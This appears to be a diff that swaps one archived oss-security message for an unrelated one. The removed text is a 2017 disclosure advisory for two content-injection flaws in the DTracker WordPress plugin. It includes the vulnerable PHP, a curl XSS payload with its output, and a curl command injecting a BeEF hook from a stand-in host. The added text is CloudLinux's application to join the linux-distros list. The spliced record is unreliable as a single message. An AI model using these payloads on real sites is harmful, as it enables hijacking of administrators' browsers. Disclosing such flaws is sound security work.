@@ -1,77 +1,138 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/21/1
-Message-id: <3181956B-7989-4A11-AC6A-5B00768B0617@me.com>
-Date: Mon, 20 Mar 2017 20:22:09 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/02/2
+Message-ID: <CA+-XxSGi7OR3a8bDcgfM9-3-tYqXF+ZnDpw2SQGYTZANjhp5DQ@mail.gmail.com>
+Date: Sun, 2 Jul 2017 17:29:25 +0300
+From: Igor Seletskiy <i@...udlinux.com>
+To: oss-security@...ts.openwall.com
+Subject: linux-distros list membership application - CloudLinux
 Content-Type: text/plain; charset=utf-8
 
-Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-03-08
-CVE-ID:[CVE-2017-1002006][CVE-2017-1002007]
-Download Site: https://wordpress.org/plugins/dtracker/
-Vendor: https://profiles.wordpress.org/dijo/
-Vendor Notified: 2017-03-09
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=186
-Description: Track the details of the users downloading the pdf files from wordpress site.
-Vulnerability:
-CVE-2017-1002006:
-In file dtracker/save_contact.php
+Hello Everyone,
 
-Doesn't check that the user is authorized before injecting new contacts into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
+I would like to apply for membership in linux-distros list for CloudLinux
+OS. Please, see application attached.
 
-$name 		= $_POST['name'];
-	$company	= $_POST['company'];
-	$phone 		= $_POST['phone'];
-	$country	= $_POST['country'];
-	$contact_id = $_POST['contact_id'];
-	
-	$table 	= 'wp_contacts';
-	$data	= array(
-				'name'		=> $name,
-				'company'	=> $company,
-				'phone'		=> $phone,
-				'country'	=> $country,
-			);
-	$where	= array(
-				'id'	=> $contact_id
-			);
-	
-$wpdb->flush();
-	
-$wpdb->update( $table, $data, $where ); //Update the Contact
+1. Be an actively maintained Unix-like operating system distro with
+substantial use of Open Source components
+CloudLinux OS https://www.cloudlinux.com is RPM based distribution launched
+in 2010 based on RedHat EL (most of the packages) and OpenVZ (kernel). We
+customize and add multiple RPMs (like Apache, PHP, python, ruby, MySQL,
+MariaDB and some others) as well as the kernel. Source code available at:
+http://repo.cloudlinux.com/cloudlinux/6/updates/SRPMS/
+http://repo.cloudlinux.com/cloudlinux/7/updates/Sources/SPackages/
 
-CVE-2017-1002007:
-In file dtracker/save_mail.php
+2. Have a userbase not limited to your own organization
+We have around 4,000 companies (mostly hosting providers) using CloudLinux
+OS across ~40,000 servers to host ~20,000,000 domains
 
-Doesn't check that the user is authorized before injecting new emails into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
+3. Have a publicly verifiable track record, dating back at least 1 year
+and continuing to present day, of fixing security issues (including some
+that had been handled on (linux-)distros, meaning that membership would
+have been relevant to you) and releasing the fixes within 10 days (and
+preferably much less than that) of the issues being made public (if it
+takes you ages to fix an issue, your users wouldn't substantially
+benefit from the additional time, often around 7 days and sometimes up
+to 14 days, that list membership could give you)
+We typically have to patch local privilege escalations in kernel asap as
+our customers are easily rooted using this type of vulnerabilities (anyone
+can buy website or hack old wordpress instance & run any code).
+
+Some records:
+The stack clash (Jun 21, 2016):
+https://www.cloudlinux.com/cloudlinux-os-blog/entry/cve-2017-1000364-fixed-for-cloudlinux-7
+Dirty Cow (Oct 21rd, 2016):
+https://www.cloudlinux.com/cloudlinux-os-blog/entry/cloudlinux-6-kernel-updated-dirty-cow-issue-fixed
+Ghost (Jan 27, 2015):
+https://www.cloudlinux.com/cloudlinux-os-blog/entry/glibc-ghost-remote-vulnerability-cve-2015-0235
 
 
-$email 	= $_POST['email'];
-	$time	= date('Y-m-d H:i:s');
-	$ip		= $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor
-	
-	$table 	= "wp_contacts";
-	$data	= array (
-				'email' 	=> $email,
-				'time'		=> $time,
-				'ip'		=> $ip	
-			);
-	
-	$wpdb->insert( $table, $data); //Insert Values
-	$contact_id = $wpdb->insert_id; //Get ID of the last inserted row
-	$data['contactId'] = $contact_id;
-	echo json_encode($data); //Pass the id to the JS
+4. Not be (only) downstream or a rebuild of another distro (or else we
+need convincing additional justification of how the list membership
+would enable you to release fixes sooner, presumably not relying on the
+upstream distro having released their fixes first?)
+Our kernel has significant amount of changes comparing to OpenVZ kernel
+We also do slight modifications to Apache web server, ship customized
+versions of PHP (multiple versions), python, ruby, MySQL and MariaDB that
+are  packaged by us, and not taken from upstream.
 
-Export: JSON TEXT XML
-Exploit Code:
-	• $ curl --data "email=\"><script>alert(1);</script>" http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
-	• {"email":"\\\"><script>alert(1);<\/script>","time":"2017-03-09 00:54:06","ip":"example.com","contactId":10577}
-	•  
-	• Or better yet, inject a BeEF hook:
-	•  
-	• $ curl --data 'email="><script src=http://BeEF_Host:3000/hook.js></script>' http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
+5. Be a participant and preferably an active contributor in relevant
+public communities (most notably, if you're not watching for issues
+being made public on oss-security, which are a superset of those that
+had been handled on (linux-)distros, then there's no valid reason for
+you to be on (linux-)distros)
+We are actively watching for issues on oss-security, but usually, the
+issues that relevant to us are already fixed by upstream distributions --
+so we didn't feel we can contribute much. I think our kernel developers can
+help with some of the work -- once we have the information in advance.
+Right now they are mostly addopting patches from up-stream, as they are
+already there...
+
+6. Accept the list policy:
+http://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-
+instructions-for-members
+(also quoted below)
+Please consider this note as acceptance of the list policy.
+
+7. Be able and willing to contribute back, preferably in specific ways
+announced in advance (so that you're responsible for a specific area and
+so that we know what to expect from which member), and demonstrate
+actual contributions once you've been a member for a while:
+http://oss-security.openwall.org/wiki/mailing-lists/distros
+#contributing-back
+(also quoted below)
+We would be happy to help with administrative tasks:
+
+   1. Promptly review new issue reports for meeting the list's requirements
+   and confirm receipt of the report and, when necessary, inform the reporter
+   of any issues with their report (e.g., obviously not actionable by the
+   distros) and request and/or propose any required yet missing information
+   (most notably, a tentative public disclosure date)
+   2. If the proposed public disclosure date is not within list policy,
+   insist on getting this corrected and propose a suitable earlier date
+
+And possibly more in the future, as we have a better understanding of the
+amount of work needed to handle those tasks.
+We will need some handholding at first to make sure we do things correctly.
+
+
+8. Be able and willing to handle PGP-encrypted e-mail
+Please, find PGP related info
+
+Leonid Kanter <lkanter@...udlinux.com>
+
+GPG Key: 0x400296079AE5954F (download
+<https://cryptup.org/pub/lkanter@cloudlinux.com>)
+GPG Fingerprint: A07D AA47 48B2 C445 6A44  9B38 4002 9607 9AE5 954F
+
+Igor Seletskiy <i@...udlinux.com>
+
+GPG Key: 0xCD7BB36D66B77E0D (download
+<https://cryptup.org/pub/i@cloudlinux.com>)
+
+GPG Fingerprint: 7FE3 681A DCBC C509 A2FF 77A4 CD7B B36D 66B7 7E0D
+
+Konstantin Olshanov <kolshanov@...udlinux.com>
+GPG Key: 0x891E1FDBF34ED0FD (download
+<https://cryptup.org/pub/kolshanov@cloudlinux.com>)
+GPG Fingerprint: B502 0D7C BB2C 674C 6387  FBDC 891E 1FDB F34E D0FD
+
+
+9. Have someone already on the private list, or at least someone else
+who has been active on oss-security for years but is not affiliated with
+your distro nor your organization, vouch for at least one of the people
+requesting membership on behalf of your distro (then that one
+vouched-for person will be able to vouch for others on your team, in
+case you'd like multiple people subscribed)
+Dmitry V. Levin <ldv@...linux.org>, Chief Architect, ALT Linux can vouch
+for Leonid Kanter.
+
+Regards,
+Igor Seletskiy |  CEO
+CloudLinux OS <https://cloudlinux.com/cloudlinuxos>   |   KernelCare
+<https://www.cloudlinux.com/kernelcare>   |   Imunify360
+<http://imunify360.com/>
+
+Get 24/7 free, exceptionally good support at cloudlinux.zendesk.com
+Follow us on twitter for technical updates: @CloudLinuxOS
+<https://twitter.com/cloudlinuxos>
 
